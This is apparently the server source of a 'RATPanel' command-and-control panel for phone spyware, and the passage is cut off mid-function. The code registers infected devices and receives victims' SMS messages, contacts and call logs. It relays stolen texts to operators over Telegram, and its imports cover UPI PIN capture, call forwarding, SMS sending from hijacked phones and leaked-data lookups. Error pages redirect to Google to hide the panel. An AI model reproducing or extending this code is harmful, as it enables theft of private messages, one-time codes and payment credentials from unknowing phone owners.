from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query, Depends, Request, BackgroundTasks, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, RedirectResponse, StreamingResponse
from fastapi.exceptions import RequestValidationError
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
from datetime import datetime, timedelta, timezone
import json
import io
import zipfile
import logging
import asyncio
import os
from typing import Optional

from .config import settings
from .database import connect_to_mongodb, close_mongodb_connection, mongodb
from .services.websocket_manager import manager
from .services.device_service import device_service
from .services.admin_ws_manager import admin_ws_manager
from .services.auth_service import auth_service
from .services.admin_activity_service import admin_activity_service
from .services.telegram_multi_service import telegram_multi_service
from .services.firebase_service import firebase_service
from .services.firebase_admin_service import firebase_admin_service
from .utils.datetime_utils import to_iso_string, ensure_utc
from bson import json_util  # type: ignore
from bson import ObjectId  # type: ignore
from .background_tasks import (
    notify_device_registration_bg,
    notify_upi_detected_bg,
    notify_admin_login_bg,
    notify_admin_logout_bg,
    send_2fa_code_bg,
    notify_new_sms_bg,
    check_offline_devices_bg,
    restart_all_heartbeats_bg,
    send_push_in_background
)

from .models.schemas import (
    Device, DeviceStatus, SendCommandRequest, UpdateSettingsRequest, UpdateNoteRequest,
    DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse,
    AppTypeInfo, AppTypesResponse, SMSDeliveryStatusRequest, SMSDeliveryStatusResponse,
    CallForwardingResult, CallForwardingResultResponse
)
from .models.admin_schemas import (
    Admin, AdminCreate, AdminUpdate, AdminLogin, TokenResponse,
    AdminResponse, ActivityType, AdminPermission, AdminRole,
    MarkDeviceRequest, MarkDeviceResponse,
    SendSmsToMarkedDeviceRequest, SendSmsToMarkedDeviceResponse,
    MarkedDeviceInfoResponse, SetMarkedDeviceSmsRequest, SetMarkedDeviceSmsResponse,
    ConfirmSendSmsRequest, ConfirmSendSmsResponse
)
from .models.otp_schemas import (
    OTPRequest, OTPVerify, OTPResponse, OTPVerifyResponse
)
from .models.bot_schemas import (
    BotOTPRequest, BotOTPVerify, BotOTPResponse, BotTokenResponse, BotStatusResponse
)
from .models.upi_schemas import (
    UPIPinSave, UPIPinResponse
)
from .models.tools import LeakLookupRequest, LeakLookupResponse
from .utils.auth_middleware import (
    get_current_admin, get_optional_admin, require_permission,
    get_client_ip, get_user_agent, authenticate_admin_token
)
from .services.otp_service import otp_service
from .services.auth_service import ENABLE_2FA
from .utils.datetime_utils import utc_now
from .services.leak_lookup_service import leak_lookup_service, LeakLookupError
from .api.queue_metrics import router as queue_metrics_router

logging.basicConfig(
    level=logging.INFO if settings.DEBUG else logging.WARNING,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def _format_datetime(dt):
    if dt is None:
        return None
    if isinstance(dt, datetime):
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt.isoformat()
    return None

def _ensure_system_super_admin(admin: Admin):
    if admin.role != AdminRole.SUPER_ADMIN or (admin.created_by or "").lower() != "system":
        raise HTTPException(
            status_code=403,
            detail="Only the system super admin can perform this action"
        )

app = FastAPI(
    title="RATPanel Control Server",
    description="WebSocket Server + REST API with Admin Panel & Telegram Integration",
    version="2.0.0",
    debug=settings.DEBUG,
    docs_url=None,
    redoc_url=None,
    openapi_url=None
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "*"

    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

from .middleware.error_handler import ErrorHandlerMiddleware
app.add_middleware(ErrorHandlerMiddleware, redirect_to_google=True)

# Include routers
app.include_router(queue_metrics_router)


@app.websocket("/ws/admin")
async def admin_websocket(websocket: WebSocket):
    token = websocket.query_params.get("token")

    try:
        admin = await authenticate_admin_token(token)
    except HTTPException as exc:
        await websocket.close(code=4401, reason=exc.detail)
        return

    await websocket.accept()
    connection_id = await admin_ws_manager.register(admin.username, websocket)

    await websocket.send_json({
        "type": "connected",
        "username": admin.username,
        "message": "WebSocket connected"
    })

    last_ping_time = utc_now()
    last_pong_time = utc_now()
    last_activity = utc_now()  # Track any activity
    ping_timeout = timedelta(seconds=120)  # Increased: Timeout if no ping for 120 seconds
    pong_timeout = timedelta(seconds=90)  # Increased: Timeout if no pong for 90 seconds
    server_ping_interval = timedelta(seconds=15)  # Server sends ping every 15 seconds (more frequent)
    last_server_ping = utc_now()
    connection_start_time = utc_now()

    async def send_server_ping():
        """Send ping from server to client"""
        try:
            await websocket.send_json({
                "type": "ping",
                "timestamp": int(utc_now().timestamp() * 1000),
                "from": "server"
            })
            return True
        except Exception as e:
            logger.warning(f"Failed to send server ping to {admin.username}: {e}")
            return False

    try:
        while True:
            try:
                # Use receive with shorter timeout for more frequent health checks
                raw_message = await asyncio.wait_for(
                    websocket.receive_text(),
                    timeout=8.0  # Check every 8 seconds for server ping
                )
                last_ping_time = utc_now()
                last_activity = utc_now()
            except asyncio.TimeoutError:
                # Always send server ping if interval passed
                if utc_now() - last_server_ping >= server_ping_interval:
                    if not await send_server_ping():
                        logger.warning(f"Failed to send ping to {admin.username}, connection may be dead")
                        break
                    last_server_ping = utc_now()
                
                # More lenient timeout checks - only warn, don't disconnect immediately
                time_since_ping = utc_now() - last_ping_time
                time_since_pong = utc_now() - last_pong_time
                time_since_activity = utc_now() - last_activity
                
                # Only disconnect if really dead (no activity for a long time)
                if time_since_activity > timedelta(seconds=180):  # 3 minutes of no activity
                    logger.warning(f"Admin WS timeout (no activity for 3min) for {admin.username}, closing connection")
                    break
                
                # Warn but don't disconnect for ping/pong timeouts
                if time_since_ping > ping_timeout:
                    logger.debug(f"Admin WS: No client ping for {time_since_ping.total_seconds()}s from {admin.username}")
                
                if time_since_pong > pong_timeout:
                    logger.debug(f"Admin WS: No client pong for {time_since_pong.total_seconds()}s from {admin.username}")
                
                continue
            except WebSocketDisconnect:
                raise

            try:
                payload = json.loads(raw_message)
            except json.JSONDecodeError:
                await websocket.send_json({
                    "type": "error",
                    "message": "Invalid JSON payload"
                })
                continue

            action = payload.get("action")
            device_id = payload.get("device_id")

            if action == "subscribe":
                last_activity = utc_now()
                success = await admin_ws_manager.subscribe(connection_id, device_id)
                await websocket.send_json({
                    "type": "subscribed" if success else "error",
                    "device_id": device_id,
                    "message": "Subscribed" if success else "Subscription failed"
                })
            elif action == "unsubscribe":
                last_activity = utc_now()
                await admin_ws_manager.unsubscribe(connection_id, device_id)
                await websocket.send_json({
                    "type": "unsubscribed",
                    "device_id": device_id,
                    "message": "Unsubscribed"
                })
            elif action == "ping":
                last_ping_time = utc_now()
                last_activity = utc_now()
                await websocket.send_json({
                    "type": "pong",
                    "timestamp": int(utc_now().timestamp() * 1000),
                    "from": "server"
                })
            elif action == "pong":
                # Client responded to our ping
                last_pong_time = utc_now()
                last_activity = utc_now()
                logger.debug(f"Received pong from {admin.username}")
            else:
                await websocket.send_json({
                    "type": "error",
                    "message": f"Unknown action: {action}"
                })

    except WebSocketDisconnect:
        logger.info(f"Admin WS disconnected: {admin.username}")
    except Exception as exc:
        logger.error(f"Admin WS error for {admin.username}: {exc}", exc_info=True)
    finally:
        await admin_ws_manager.disconnect(connection_id)


@app.exception_handler(StarletteHTTPException)
async def http_exception_handler(request: Request, exc: StarletteHTTPException):
    is_api = request.url.path.startswith("/api/")
    
    if exc.status_code == 401:
        session_expired = exc.headers.get("X-Session-Expired", "false") if exc.headers else "false"
        return JSONResponse(
            status_code=401,
            content={
                "detail": exc.detail,
                "session_expired": session_expired == "true",
                "redirect_to_login": True
            },
            headers={"X-Session-Expired": session_expired}
        )
    
    if exc.status_code >= 400:
        logger.warning(f"HTTP {exc.status_code} error: {exc.detail} from {request.client.host if request.client else 'unknown'}")
        if is_api:
            return JSONResponse(
                status_code=exc.status_code,
                content={"detail": exc.detail}
            )
        return RedirectResponse(url="https://www.google.com", status_code=302)
    
    return JSONResponse(
        status_code=exc.status_code,
        content={"detail": exc.detail}
    )

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    is_api = request.url.path.startswith("/api/")
    logger.warning(f"Validation error from {request.client.host if request.client else 'unknown'}: {exc.errors()}")
    if is_api:
        return JSONResponse(
            status_code=422,
            content={"detail": exc.errors()}
        )
    return RedirectResponse(url="https://www.google.com", status_code=302)

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    is_api = request.url.path.startswith("/api/")
    logger.error(f"Unhandled exception from {request.client.host if request.client else 'unknown'}: {exc}", exc_info=True)
    if is_api:
        return JSONResponse(
            status_code=500,
            content={"detail": "Internal server error"}
        )
    return RedirectResponse(url="https://www.google.com", status_code=302)

@app.on_event("startup")
async def startup_event():
    logger.info("Starting Control Server...")
    
    # Initialize Redis Connection Pool (centralized)
    try:
        from .services.redis_connection_pool import redis_manager
        redis_available = await redis_manager.initialize()
        if redis_available:
            logger.info("✅ Redis connection pool initialized successfully")
        else:
            logger.warning("⚠️ Redis connection pool not available")
    except Exception as e:
        logger.error(f"❌ Failed to initialize Redis connection pool: {e}")
        redis_available = False
    
    # Initialize Device Online Tracker (Redis-based)
    from .services.device_online_tracker import device_online_tracker
    redis_tracker_ok = await device_online_tracker.initialize()
    if redis_tracker_ok:
        logger.info("✅ Device Online Tracker initialized successfully")
    else:
        logger.error("❌ Device Online Tracker initialization FAILED - devices will show offline!")

    
    # Setup Redis notification handler for SMS confirmation
    try:
        async def handle_sms_confirmation(device_id: str, notification_data: dict):
            notification_type = notification_data.get('notification_type')
            if notification_type == 'sms_confirmation_required':
                await admin_ws_manager._handle_redis_sms_confirmation(device_id, notification_data)
        
        redis_pubsub_service.set_notification_handler(handle_sms_confirmation)
        await redis_pubsub_service.initialize()
        await redis_pubsub_service.start_subscriber()
        logger.info("✅ Redis Pub/Sub initialized for SMS confirmation notifications")
    except Exception as e:
        logger.warning(f"⚠️ Redis Pub/Sub initialization failed: {e}. Will use direct WebSocket send.")
    await connect_to_mongodb()

    await auth_service.create_default_admin()

    # Initialize Redis Pub/Sub for cross-worker WebSocket notifications
    from .services.redis_pubsub import redis_pubsub_service
    from .services.admin_ws_manager import admin_ws_manager
    from .services.websocket_notification_queue import NotificationType
    
    # Initialize Redis
    redis_available = await redis_pubsub_service.initialize()
    
    if redis_available:
        # Set handler for Redis messages (when this worker receives a message from Redis)
        async def handle_redis_notification(device_id: str, notification_data: dict):
            """Handle notification received from Redis Pub/Sub"""
            try:
                notification_type_str = notification_data.get('notification_type', 'sms')
                payload = notification_data.get('notification', {})
                
                if notification_type_str == 'sms':
                    await admin_ws_manager._notify_impl(device_id, NotificationType.SMS, payload)
                elif notification_type_str == 'sms_update':
                    await admin_ws_manager._notify_impl(device_id, NotificationType.SMS_UPDATE, payload)
                elif notification_type_str == 'device_update':
                    await admin_ws_manager._notify_impl(device_id, NotificationType.DEVICE_UPDATE, payload)
                elif notification_type_str == 'sms_confirmation_required':
                    await admin_ws_manager._handle_redis_sms_confirmation(device_id, notification_data)
                elif notification_type_str == 'sms_sent_via_mark':
                    await admin_ws_manager._handle_redis_sms_sent_via_mark(device_id, notification_data)
            except Exception as e:
                logger.error(f"❌ Error handling Redis notification: {e}", exc_info=True)
        
        redis_pubsub_service.set_notification_handler(handle_redis_notification)
        await redis_pubsub_service.start_subscriber()
        logger.info("✅ Redis Pub/Sub initialized - WebSocket notifications will work across all workers")
    else:
        logger.warning("⚠️ Redis not available - WebSocket notifications will only work within each worker")

    # DISABLED: Ping background tasks
    # try:
    #     asyncio.create_task(check_offline_devices_bg(mongodb))
    #     logger.info("Background task queued: Offline devices checker (every 2 min)")
    # except Exception as e:
    #     logger.error(f"Failed to queue offline devices checker task: {e}", exc_info=True)

    # try:
    #     asyncio.create_task(restart_all_heartbeats_bg(firebase_service, mongodb))
    #     logger.info("Background task queued: Ping all devices (every 10 min via topic)")
    # except Exception as e:
    #     logger.error(f"Failed to queue ping task: {e}", exc_info=True)

    # Initialize daily backup service
    try:
        from .services.backup_service import BackupService
        from .background_tasks import daily_backup_bg
        
        mongodb_url = os.getenv("MONGODB_URL", settings.MONGODB_URL)
        db_name = os.getenv("MONGODB_DB_NAME", settings.MONGODB_DB_NAME)
        backup_dir = os.getenv("BACKUP_DIR", "/app/backups")
        
        backup_service = BackupService(
            mongodb_url=mongodb_url,
            db_name=db_name,
            backup_dir=backup_dir
        )
        
        asyncio.create_task(daily_backup_bg(backup_service, mongodb))
        logger.info("📦 Background task queued: Daily MongoDB backup (every day at midnight UTC)")
    except Exception as e:
        logger.error(f"Failed to queue daily backup task: {e}", exc_info=True)

    # Start device sync service (syncs Redis online status to MongoDB)
    try:
        from .services.device_sync_service import sync_offline_devices_to_mongodb
        asyncio.create_task(sync_offline_devices_to_mongodb())
        logger.info("🔄 Background task queued: Device sync service (every 2 min)")
    except Exception as e:
        logger.error(f"Failed to queue device sync task: {e}", exc_info=True)

    logger.info("🚀 Server is ready!")

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("Shutting down server...")
    
    # Stop Device Online Tracker
    from .services.device_online_tracker import device_online_tracker
    await device_online_tracker.close()
    
    # Stop Redis Pub/Sub
    from .services.redis_pubsub import redis_pubsub_service
    await redis_pubsub_service.stop()
    logger.info("Redis Pub/Sub stopped")
    
    # Close Redis Connection Pool
    try:
        from .services.redis_connection_pool import redis_manager
        await redis_manager.close()
        logger.info("Redis connection pool closed")
    except Exception as e:
        logger.error(f"Failed to close Redis connection pool: {e}")
    
    await close_mongodb_connection()
    logger.info("Server stopped!")

@app.post("/devices/heartbeat")
async def device_heartbeat(request: Request):
    try:
        data = await request.json()
        device_id = data.get("deviceId")

        if not device_id:
            raise HTTPException(status_code=400, detail="deviceId required")

        now = utc_now()

        # Mark device as active (updates both Redis and MongoDB with last_online_update)
        await device_service.mark_device_activity(device_id)

        # Also update last_ping and reset FCM ping flag
        await mongodb.db.devices.update_one(
            {"device_id": device_id},
            {
                "$set": {
                    "last_ping": now,
                },
                "$unset": {"fcm_ping_sent_at": ""}  # Reset FCM ping flag when device pings
            }
        )

        logger.debug(f"Heartbeat received from device: {device_id}")
        
        # Add log for heartbeat
        try:
            await device_service.add_log(
                device_id,
                "heartbeat",
                "Device heartbeat received",
                "info"
            )
        except Exception as e:
            logger.warning(f"Failed to add heartbeat log: {e}")
        
        # Notify admins about device heartbeat/status update via WebSocket
        try:
            from .services.admin_ws_manager import admin_ws_manager
            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            if device_doc:
                device_payload = {
                    "device_id": device_id,
                    "status": "online",
                    "is_online": True,
                    "battery_level": device_doc.get("battery_level"),
                    "last_ping": to_iso_string(now),
                    "last_online_update": to_iso_string(now),
                    "updated_at": to_iso_string(now),
                }
                await admin_ws_manager.notify_device_update(device_id, device_payload)
                logger.debug(f"WebSocket notification sent for device heartbeat: device={device_id}")
        except Exception as e:
            logger.warning(f"Failed to send WebSocket notification for device heartbeat: {e}")

        return {"success": True, "message": "Heartbeat received"}

    except Exception as e:
        logger.error(f"Heartbeat error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/ping-response")
async def ping_response(request: Request):
    try:
        data = await request.json()
        device_id = data.get("deviceId") or data.get("device_id")

        if not device_id:
            logger.warning(f"⚠️ [PING-RESPONSE] Ping response received without deviceId")
            raise HTTPException(status_code=400, detail="deviceId required")

        # Always log ping response for debugging
        logger.info(f"[PING_DEBUG] 🟢 [PING-RESPONSE] START - Device: {device_id}")
        
        # Check timestamps BEFORE update
        device_before = await mongodb.db.devices.find_one(
            {"device_id": device_id},
            {"last_ping": 1, "last_online_update": 1}
        )
        if device_before:
            logger.info(f"[PING_DEBUG] 🟢 [PING-RESPONSE] BEFORE - last_ping: {device_before.get('last_ping')}, last_online_update: {device_before.get('last_online_update')}")

        now = utc_now()

        # ✅ Device responded to ping - this is actual device activity!
        # Update both last_ping and last_online_update
        await device_service.mark_device_activity(device_id)
        
        # Also update last_ping specifically for ping tracking
        await mongodb.db.devices.update_one(
            {"device_id": device_id},
            {
                "$set": {
                    "last_ping": now,
                    "updated_at": now
                }
            }
        )
        
        logger.info(f"[PING_DEBUG] 🟢 [PING-RESPONSE] UPDATED - last_ping: {now}, last_online_update: {now}")

        await device_service.add_log(
            device_id,
            "ping",
            "Ping response received successfully",
            "success"
        )

        # Notify admins via WebSocket that device responded to ping
        try:
            from .services.admin_ws_manager import admin_ws_manager
            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            if device_doc:
                device_payload = {
                    "device_id": device_id,
                    "status": "online",
                    "is_online": True,
                    "battery_level": device_doc.get("battery_level"),
                    "last_ping": to_iso_string(now),
                    "last_online_update": to_iso_string(now),
                    "updated_at": to_iso_string(now),
                }
                logger.info(f"[PING_DEBUG] 🟢 [PING-RESPONSE] Sending WebSocket notification with timestamps: last_ping={to_iso_string(now)}, last_online_update={to_iso_string(now)}")
                await admin_ws_manager.notify_device_update(device_id, device_payload)
                logger.info(f"[PING_DEBUG] 🟢 [PING-RESPONSE] WebSocket notification sent")
        except Exception as e:
            logger.warning(f"Failed to send WebSocket notification for ping response: {e}")

        logger.info(f"[PING_DEBUG] 🟢 [PING-RESPONSE] END - Device: {device_id}")

        return {"success": True, "message": "Ping response received"}

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ [PING-RESPONSE] Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/upload-response")
async def upload_response(request: Request):
    try:
        data = await request.json()
        device_id = data.get("device_id") or data.get("deviceId")
        status = data.get("status")
        count = data.get("count", 0)
        error = data.get("error")

        if not device_id or not status:
            raise HTTPException(status_code=400, detail="device_id and status required")

        # Mark device as active (updates both Redis and MongoDB)
        await device_service.mark_device_activity(device_id)

        logger.info(f"Upload response from {device_id}: {status} - Count: {count}")

        upload_type = "Unknown"
        if "sms" in status.lower():
            upload_type = "SMS"
        elif "contacts" in status.lower():
            upload_type = "Contacts"

        log_message = f"{upload_type} upload: {count} items"
        if error:
            log_message += f" - Error: {error}"

        log_level = "success" if "success" in status else "error"

        await device_service.add_log(
            device_id,
            "upload",
            log_message,
            log_level,
            metadata={
                "status": status,
                "count": count,
                "error": error,
                "type": upload_type
            }
        )

        if "success" in status and count > 0:
            try:
                device = await device_service.get_device(device_id)
                if device and device.admin_username:
                    await telegram_multi_service.send_to_admin(
                        device.admin_username,
                        f"✅ {upload_type} Upload Complete\n"
                        f"📱 Device: <code>{device_id}</code>\n"
                        f"📊 Count: {count} items",
                        bot_index=1
                    )
            except Exception as tg_error:
                logger.warning(f"Failed to send Telegram notification for upload: {tg_error}")

        return {"success": True, "message": "Upload response received"}

    except Exception as e:
        logger.error(f"Upload response error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/register")
async def register_device(message: dict, background_tasks: BackgroundTasks):
    logger.info("=" * 80)
    logger.info("DEVICE REGISTRATION STARTED")
    logger.info("=" * 80)
    
    try:
        device_id = message.get("device_id")
        device_info = message.get("device_info", {})
        admin_token = message.get("admin_token") or message.get("user_id")
        app_type = message.get("app_type")

        if not device_id:
            logger.error("[REGISTER] ERROR: device_id is missing")
            raise HTTPException(status_code=400, detail="device_id is required")

        is_initial = message.get("is_initial", False)
        logger.info(f"[REGISTER] device_id: {device_id}, app_type: {app_type}, admin_token: {bool(admin_token)}, is_initial: {is_initial}")

        if app_type:
            device_info["app_type"] = app_type
        
        device_info["is_initial"] = is_initial

        try:
            result = await device_service.register_device(device_id, device_info, admin_token)
            is_new = result.get('is_new', False)
            logger.info(f"[REGISTER] Device registered - is_new: {is_new}, is_initial: {is_initial}")
        except Exception as e:
            logger.error(f"[REGISTER] [EXCEPT] register_device failed: {str(e)}", exc_info=True)
            raise
        
        try:
            await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
        except Exception as e:
            logger.warning(f"[REGISTER] [EXCEPT] add_log failed: {str(e)}")

        if is_new and admin_token and result.get("device") and result["device"].get("admin_username"):
            admin_username = result["device"]["admin_username"]
            try:
                background_tasks.add_task(
                    notify_device_registration_bg,
                    telegram_multi_service,
                    firebase_admin_service,
                    admin_username,
                    device_id,
                    device_info,
                    admin_token
                )
                logger.info(f"[REGISTER] Notifications queued for admin: {admin_username}")
            except Exception as e:
                logger.error(f"[REGISTER] [EXCEPT] queue notifications failed: {str(e)}", exc_info=True)
        elif not is_new:
            logger.info(f"[REGISTER] Device {device_id} already exists, skipping notifications")

        logger.info(f"[REGISTER] Registration completed - device: {device_id}")
        logger.info("=" * 80)

        return {
            "status": "success",
            "message": "Device registered successfully",
            "device_id": device_id
        }
    
    except HTTPException:
        logger.error("=" * 80)
        logger.error("DEVICE REGISTRATION FAILED - HTTP Exception")
        logger.error("=" * 80)
        raise
    except Exception as e:
        logger.error("=" * 80)
        logger.error(f"DEVICE REGISTRATION FAILED: {str(e)}", exc_info=True)
        logger.error("=" * 80)
        raise HTTPException(
            status_code=500,
            detail=f"Internal server error during device registration: {str(e)}"
        )


@app.post("/battery")
async def battery_update(message: dict):
    device_id = message.get("device_id")
    data = message.get("data", {})

    battery_level = data.get("battery")
    is_online = data.get("is_online", True)

    # Mark device as active (updates both Redis and MongoDB)
    await device_service.mark_device_activity(device_id)

    if battery_level is not None:
        await device_service.update_battery_level(device_id, battery_level)

    await device_service.update_online_status(device_id, is_online)
    await device_service.add_log(device_id, "battery", f"Battery: {battery_level}%", "info")

    return {"status": "success"}

@app.post("/sms/batch")
async def sms_history(message: dict):
    device_id = message.get("device_id")
    sms_list = message.get("data", [])
    batch_info = message.get("batch_info", {})

    # Mark device as active (updates both Redis and MongoDB)
    await device_service.mark_device_activity(device_id)

    await device_service.save_sms_history(device_id, sms_list)

    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "sms", f"SMS: {len(sms_list)} messages {batch_text}".strip(), "info")

    return {"status": "success"}

@app.post("/contacts/batch")
async def contacts_bulk(message: dict):

    device_id = message.get("device_id")
    contacts_list = message.get("data", [])
    batch_info = message.get("batch_info", {})

    # Mark device as active (updates both Redis and MongoDB)
    await device_service.mark_device_activity(device_id)

    await device_service.save_contacts(device_id, contacts_list)

    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "contacts", f"Contacts: {len(contacts_list)} {batch_text}".strip(), "info")

    return {"status": "success"}

@app.post("/call-logs/batch")
async def call_history(message: dict):
    try:
        device_id = message.get("device_id")
        call_logs = message.get("data", [])
        batch_info = message.get("batch_info", {})

        if not device_id:
            logger.warning("Call logs batch: missing device_id")
            return {"status": "error", "message": "device_id is required"}

        if not call_logs:
            logger.warning(f"Call logs batch: empty call_logs for device {device_id}")
            return {"status": "success", "message": "no call logs to save"}

        # Mark device as active (updates both Redis and MongoDB)
        await device_service.mark_device_activity(device_id)

        logger.info(f"Received {len(call_logs)} call logs from device {device_id}")
        await device_service.save_call_logs(device_id, call_logs)

        batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
        await device_service.add_log(device_id, "call_logs", f"Call logs: {len(call_logs)} {batch_text}".strip(), "info")

        return {"status": "success"}
    except Exception as e:
        logger.error(f"Call logs batch endpoint error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}


@app.post("/api/tools/leak-lookup", response_model=LeakLookupResponse)
async def leak_lookup_api(
    lookup_request: LeakLookupRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    query = lookup_request.query.strip()
    if not query:
        raise HTTPException(status_code=400, detail="Query is required")

    try:
        data = await leak_lookup_service.lookup(
            query=query,
            limit=lookup_request.limit,
            lang=lookup_request.lang,
            response_type=lookup_request.response_type,
            bot_name=lookup_request.bot_name,
        )
    except LeakLookupError as exc:
        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.LOOKUP_REQUEST,
                description=f"Leak lookup failed for query: {query}",
                ip_address=get_client_ip(request),
                user_agent=get_user_agent(request),
                metadata={
                    "limit": lookup_request.limit,
                    "lang": lookup_request.lang,
                },
                success=False,
                error_message=str(exc),
                send_telegram=False,
            )
        )
        raise HTTPException(status_code=502, detail=str(exc))

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.LOOKUP_REQUEST,
            description=f"Leak lookup executed for query: {query}",
            ip_address=get_client_ip(request),
            user_agent=get_user_agent(request),
            metadata={
                "limit": lookup_request.limit,
                "lang": lookup_request.lang,
            },
            send_telegram=False,
        )
    )

    return LeakLookupResponse(success=True, data=data)


@app.post("/sms/new")
async def receive_sms(request: Request):
    try:
        data = await request.json()
        logger.info(f"📨 [SMS] Received SMS request - Data keys: {list(data.keys())}")

        device_id = data.get("device_id") or data.get("deviceId")
        logger.info(f"📨 [SMS] Device ID: {device_id}")

        if "data" in data:
            sms_info = data.get("data", {})
            sender = sms_info.get("from")
            message = sms_info.get("body") or sms_info.get("message")
            timestamp = sms_info.get("timestamp")
            logger.info(f"📨 [SMS] SMS from data object - From: {sender}, Message length: {len(message) if message else 0}")
        else:
            sender = data.get("sender") or data.get("from")
            message = data.get("message") or data.get("body")
            timestamp = data.get("timestamp")
            logger.info(f"📨 [SMS] SMS from root - From: {sender}, Message length: {len(message) if message else 0}")

        if not device_id:
            logger.error(f"❌ [SMS] Missing device_id in request")
            raise HTTPException(status_code=400, detail="device_id is required")

        if not sender or not message:
            logger.error(f"❌ [SMS] Missing sender or message - Device: {device_id}, Sender: {sender}, Has message: {bool(message)}")
            raise HTTPException(status_code=400, detail="sender and message are required")

        # Mark device as active (updates both Redis and MongoDB)
        await device_service.mark_device_activity(device_id)

        device = await device_service.get_device(device_id)
        if not device:
            await device_service.register_device(device_id, {
                "device_name": "Unknown Device",
                "registered_via": "sms_endpoint"
            })
            device = await device_service.get_device(device_id)

        sms_data = {
            "from": sender,
            "to": data.get("to"),
            "body": message.replace('\ufffd', '').strip(),
            "timestamp": timestamp,
            "type": data.get("type", "inbox"),
            "received_in_native": data.get("received_in_native", True)
        }
        
        if data.get("sim_phone_number"):
            sms_data["sim_phone_number"] = data.get("sim_phone_number")
        
        if data.get("sim_slot") is not None:
            sms_data["sim_slot"] = data.get("sim_slot")

        sms_saved = False
        try:
            logger.info(f"💾 [SMS] Saving SMS to database - Device: {device_id}, From: {sender}, Message length: {len(message)}")
            sms_saved = await device_service.save_new_sms(device_id, sms_data)
            logger.info(f"✅ [SMS] SMS saved: {sms_saved} - Device: {device_id}, From: {sender}")
        except Exception as save_error:
            logger.error(f"❌ [SMS] Failed to save SMS - Device: {device_id}, Error: {save_error}", exc_info=True)
            raise HTTPException(
                status_code=500,
                detail=f"Failed to save SMS: {str(save_error)}"
            )

        if sms_saved and device and device.admin_username:
            logger.info(f"📡 [SMS] Sending Telegram notification - Device: {device_id}, Admin: {device.admin_username}")
            try:
                await telegram_multi_service.notify_new_sms(
                    device_id, device.admin_username, sender, message
                )
            except Exception as e:
                logger.warning(f"⚠️ [SMS] Telegram notification failed: {e}")

        try:
            await device_service.add_log(
                device_id,
                "sms",
                f"New SMS from {sender}",
                "info"
            )
        except Exception as e:
            logger.warning(f"⚠️ [SMS] Failed to add log: {e}")

        logger.info(f"✅ [SMS] SMS received and processed successfully - Device: {device_id}, From: {sender}")
        return {
            "status": "success",
            "device_id": device_id,
            "message": "SMS received successfully"
        }

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"Internal server error: {str(e)}"
        )

@app.post("/sms/delivery-status", response_model=SMSDeliveryStatusResponse)
async def sms_delivery_status(delivery_data: SMSDeliveryStatusRequest):
    try:
        device_id = delivery_data.device_id
        sms_id = delivery_data.sms_id
        phone = delivery_data.phone
        message = delivery_data.message
        sim_slot = delivery_data.sim_slot
        sim_phone_number = delivery_data.sim_phone_number or ""
        display_sim_slot = sim_slot + 1 if isinstance(sim_slot, int) else "Unknown"
        status = delivery_data.status.value
        details = delivery_data.details
        timestamp = delivery_data.timestamp

        # Mark device as active (updates both Redis and MongoDB)
        await device_service.mark_device_activity(device_id)

        device = await device_service.get_device(device_id)
        if not device:
            raise HTTPException(status_code=404, detail="Device not found")

        if status in ["sent", "delivered"]:

            device_phone = sim_phone_number if (sim_phone_number and (sim_phone_number.isdigit() or len(sim_phone_number) >= 10)) else "Unknown"
            
            if device_phone == "Unknown":
                sim_info = getattr(device, 'sim_info', []) or []
                
                if sim_info and isinstance(sim_info, list) and len(sim_info) > sim_slot:
                    device_phone = getattr(sim_info[sim_slot], 'phone_number', "Unknown")
                elif sim_info and isinstance(sim_info, list) and len(sim_info) > 0:
                    device_phone = getattr(sim_info[0], 'phone_number', "Unknown")

            sms_data = {
                "from": device_phone,
                "to": phone,
                "body": message.replace('\ufffd', '').strip() if message else "",
                "timestamp": timestamp,
                "type": "sent",
                "sms_id": sms_id,
                "sim_slot": sim_slot,
                "sim_phone_number": sim_phone_number if sim_phone_number else None,
                "delivery_status": status,
                "delivery_details": details,
                "received_in_native": False
            }

            # Check if SMS already exists (for delivery status updates)
            existing_sms = await mongodb.db.sms_messages.find_one({"sms_id": sms_id})
            
            if existing_sms:
                # Update existing SMS with new delivery status
                update_data = {
                    "$set": {
                        "delivery_status": status,
                        "delivery_details": details,
                    }
                }
                
                result = await mongodb.db.sms_messages.update_one(
                    {"sms_id": sms_id},
                    update_data
                )
                
                if result.modified_count > 0:
                    # Get updated SMS
                    updated_sms = await mongodb.db.sms_messages.find_one({"sms_id": sms_id})
                    
